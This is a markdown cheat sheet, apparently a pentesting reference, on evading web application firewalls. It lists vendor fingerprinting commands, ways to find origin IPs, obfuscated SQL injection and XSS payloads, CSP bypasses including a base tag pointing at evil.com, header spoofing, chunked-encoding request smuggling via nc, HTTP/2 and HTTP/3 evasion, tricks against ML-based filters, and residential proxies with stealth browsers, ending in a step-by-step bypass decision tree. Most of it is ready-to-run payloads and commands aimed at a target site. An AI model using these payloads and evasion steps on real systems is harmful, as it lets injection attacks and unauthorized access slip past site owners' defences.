# WAF Bypass Techniques

## When to Use
- WAF is blocking payloads (403, challenge pages, dropped connections)
- Testing behind Cloudflare, Akamai, Imperva, AWS WAF, ModSecurity
- Standard XSS/SQLi/SSRF payloads are being filtered
- Need to find origin server IP to bypass CDN/WAF entirely

## WAF Detection & Fingerprinting

### Indicators by Vendor

| WAF | Detection Signals |
|-----|-------------------|
| Cloudflare | `__cf_bm`, `cf_clearance` cookies, `/cdn-cgi/` routes, `cf-ray` header |
| Akamai | `AkamaiGHost` server header, `X-Akamai-*` headers |
| Imperva/Incapsula | `X-CDN: Incapsula`, `visid_incap_*` cookies |
| AWS WAF | `AWSALB` or `AWSALBCORS` cookies, `x-amzn-RequestId` |
| ModSecurity | Specific error pages mentioning "ModSecurity", 403 with rule IDs |
| Sucuri | `X-Sucuri-ID` headers |
| Fastly | `fastly-debug-*` headers, `X-Served-By` |
| F5 BIG-IP ASM | `TS` cookies, `X-WA-Info` header |

### Fingerprinting Commands
```bash
# WAFW00F (largest fingerprint database)
wafw00f https://target.com

# Manual header check
curl -sI https://target.com | grep -iE "server|x-cdn|cf-ray|x-sucuri|x-akamai|AWSALB"

# Trigger WAF with obvious payload to see block page
curl -s "https://target.com/?id=1' OR 1=1--" -o /dev/null -w "%{http_code}"
curl -s "https://target.com/<script>alert(1)</script>" -D-
```

---

## Bypass Techniques

### 1. Origin Server Discovery (Skip WAF Entirely)

Find the real server IP and send requests directly:

```bash
# Historical DNS records
# SecurityTrails, ViewDNS.info, DNSHistory.org

# Shodan/Censys for SSL cert matching
shodan search "ssl.cert.subject.cn:target.com"
censys search "services.tls.certificates.leaf.names: target.com"

# CloudFlair tool
python3 cloudflair.py target.com

# Check for IP leakage in headers
curl -sI https://target.com | grep -iE "x-real-ip|x-forwarded|x-backend|x-host"

# Check Alt-Svc header (HTTP/3 origin leak)
curl -sI https://target.com | grep -i "alt-svc"

# Forge request directly to origin
curl -sk -H "Host: target.com" https://<origin-ip>/

# bypass-firewalls-by-DNS-history
# https://github.com/vincentcox/bypass-firewalls-by-DNS-history
bash bypass-firewalls-by-DNS-history.sh -d target.com
```

### 2. SQLi WAF Bypasses

| Technique | Example | Notes |
|-----------|---------|-------|
| Case variation | `SeLeCt`, `UnIoN` | Basic but still works on regex WAFs |
| Comment injection | `UN/**/ION SE/**/LECT` | Breaks keyword matching |
| URL encoding | `%55%4E%49%4F%4E` | Single encoding |
| Double encoding | `%2527` (decodes to `%27` then `'`) | When app decodes twice |
| Hex encoding | `0x53454C454354` | MySQL hex strings |
| Whitespace manipulation | `UNION\t\nSELECT`, `UNION%0aSELECT` | Tabs, newlines, vertical tabs |
| String concatenation | MySQL: `CONCAT('sel','ect')`, Oracle: `'sel'\|\|'ect'` | Build keywords dynamically |
| Null byte | `%00' UNION SELECT...` | Terminates WAF string parsing |
| JSON injection (CVE-2023-50969) | `{"id": {"$gt": "' OR 1=1--"}}` | Bypasses many WAFs |
| Scientific notation | `1e0UNION SELECT` | No space needed |
| Inline comments | `/*!50000UNION*//*!50000SELECT*/` | MySQL version-specific comments |

```bash
# SQLMap tamper scripts for WAF bypass
sqlmap -u "https://target.com/page?id=1" --tamper=between,randomcase,space2comment
sqlmap -u "https://target.com/page?id=1" --tamper=charencode,chardoubleencode
sqlmap -u "https://target.com/page?id=1" --tamper=equaltolike,greatest

# Common tamper combos by WAF:
# Cloudflare: --tamper=between,charencode,space2comment,randomcase
# AWS WAF: --tamper=space2mssqlblank,between,percentage
# ModSecurity: --tamper=modsecurityversioned,space2comment
```

### 3. XSS WAF Bypasses

```html
<!-- mXSS (mutation-based) — browser DOM mutation creates XSS -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- Alternative event handlers (less commonly blocked) -->
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<body onpageshow=alert(1)>
<video><source onerror=alert(1)>

<!-- JS obfuscation -->
<img src=x onerror="window['al'+'ert'](1)">
<img src=x onerror="self[atob('YWxlcnQ')](1)">
<img src=x onerror="top[/al/.source+/ert/.source](1)">

<!-- Unicode escape sequences -->
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>

<!-- Template literals -->
<script>alert`1`</script>

<!-- Polyglot (works in multiple contexts) -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//

<!-- Constructor-based -->
<img src=x onerror="Function('ale'+'rt(1)')()">
<img src=x onerror="[].constructor.constructor('alert(1)')()">

<!-- SVG with encoding -->
<svg><script>&#97;&#108;&#101;&#114;&#116;(1)</script></svg>
```

### 4. CSP Bypass Techniques

```html
<!-- JSONP endpoint abuse (if allowed domain has JSONP) -->
<script src="https://allowed-cdn.com/jsonp?callback=alert(1)//"></script>

<!-- Angular template injection (if angular.js on allowed CDN) -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>

<!-- DOM clobbering -->
<form id=self><input name=location>

<!-- base-uri not set -->
<base href="https://evil.com/">

<!-- Trusted Types gaps on allowed origins -->
<!-- Check if script-src includes 'unsafe-eval' or specific CDNs with known bypasses -->
```

### 5. HTTP Protocol Bypasses

```bash
# Method obfuscation (case variation)
curl -X "gEt" https://target.com/admin

# HTTP Parameter Pollution (duplicate params)
# Backend uses last value, WAF checks first
curl "https://target.com/search?q=safe&q=<script>alert(1)</script>"

# Header manipulation — spoof internal origin
curl -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Forwarded-Host: internal.target.com" \
     -H "X-Real-IP: 127.0.0.1" \
     -H "X-Original-URL: /admin" \
     https://target.com/

# Host header spoofing
curl -H "Host: allowed-internal.target.com" https://target.com/admin

# Content-Type confusion (send JSON payload as form data or vice versa)
curl -X POST -H "Content-Type: text/plain" \
     -d '{"id":"1 UNION SELECT 1--"}' https://target.com/api

# Chunked transfer encoding (split payload across chunks)
printf 'POST /search HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\n\r\n3\r\nq=<\r\n7\r\nscript>\r\n0\r\n\r\n' | nc target.com 80
```

### 6. TLS/Protocol Evasion

```bash
# HTTP/2 — many WAFs don't fully inspect H2 streams
curl --http2 -H "Host: target.com" "https://target.com/page?id=1' OR 1=1--"

# HTTP/3 (QUIC) — most WAFs don't inspect UDP traffic
curl --http3 "https://target.com/page?id=1' OR 1=1--"

# SNI manipulation — send different SNI than Host header
openssl s_client -connect <target-ip>:443 -servername allowed.example.com

# Omit SNI entirely (some WAFs route by SNI)
curl --insecure -H "Host: target.com" https://<target-ip>/

# TLS fingerprint spoofing (match real browser JA3/JA4)
# Use curl-impersonate or utls library
curl_chrome116 "https://target.com/page?id=1' OR 1=1--"
```

### 7. ML-Based WAF Evasion

```bash
# Adversarial token injection — add benign tokens to confuse classifier
<script>/*benign normal safe content*/alert(1)</script>

# Feature engineering bypass — payload in low-weight fields
Content-Disposition: form-data; name="file"; filename="<script>alert(1)</script>"

# Embedding space manipulation — Cyrillic/Unicode lookalikes
<ѕcript>alert(1)</ѕcript>  # Cyrillic 'ѕ' instead of Latin 's'

# Padding with legitimate-looking content
' AND 1=1 /* This is a normal search query about SQL databases */ UNION SELECT password FROM users--

# Slow drip — split payload across multiple requests (for WAFs with per-request analysis)
```

### 8. Residential IPs & Browser Fortification

```bash
# Data center IPs are easily fingerprinted — use residential/mobile proxies
# Services: Bright Data, Oxylabs, SmartProxy

# undetected_chromedriver for Selenium
pip install undetected-chromedriver

# puppeteer-extra-plugin-stealth for Puppeteer
npm install puppeteer-extra puppeteer-extra-plugin-stealth

# Match JA3/JA4 fingerprints to real browsers
# curl-impersonate: https://github.com/lwthiker/curl-impersonate
curl_chrome116 https://target.com
curl_ff117 https://target.com
```

---

## Bypass Chaining (Recommended Order)

1. **Fingerprint** the WAF vendor (WAFW00F, manual header check)
2. **Origin discovery** — try to skip WAF entirely (Shodan, DNS history, cert search)
3. **Encoding/case/comment** bypasses for your specific payload type
4. **HTTP protocol tricks** — HPP, method variation, header manipulation
5. **TLS/protocol evasion** — HTTP/2, HTTP/3, SNI manipulation
6. **ML evasion** — adversarial tokens, Unicode lookalikes, padding
7. **Last resort** — residential IPs + stealth browser automation

---

## Tools

| Tool | Purpose | Install |
|------|---------|---------|
| WAFW00F | WAF fingerprinting | `pip install wafw00f` |
| CloudFlair | Origin IP via Censys | `pip install cloudflair` |
| bypass-firewalls-by-DNS-history | Origin via old DNS | GitHub clone |
| SQLMap tamper scripts | SQLi WAF bypass | Built into sqlmap |
| GoTestWAF | WAF rule testing | `go install` |
| WAFNinja | Payload fuzzing | GitHub clone |
| curl-impersonate | TLS fingerprint spoofing | GitHub releases |
| noble-tls / uTLS | Programmatic TLS spoofing | Go library |
| Param Miner (Burp) | Unkeyed header discovery | BApp Store |

---

## Quick Decision Tree

```
Payload blocked?
├── Can you find origin IP? → Test directly (skip WAF)
├── SQLi blocked?
│   ├── Try: comment injection (UN/**/ION)
│   ├── Try: case variation + encoding
│   ├── Try: JSON wrapper (CVE-2023-50969)
│   └── Try: sqlmap tamper scripts
├── XSS blocked?
│   ├── Try: alternative tags (svg, details, marquee)
│   ├── Try: JS obfuscation (constructor, atob)
│   ├── Try: mXSS (mutation-based)
│   └── Try: polyglot payloads
├── All payloads blocked?
│   ├── Try: HTTP/2 or HTTP/3
│   ├── Try: chunked encoding
│   ├── Try: HPP (duplicate params)
│   └── Try: residential IP + browser automation
└── Still blocked? → Document WAF as hardened, move to other vectors
```
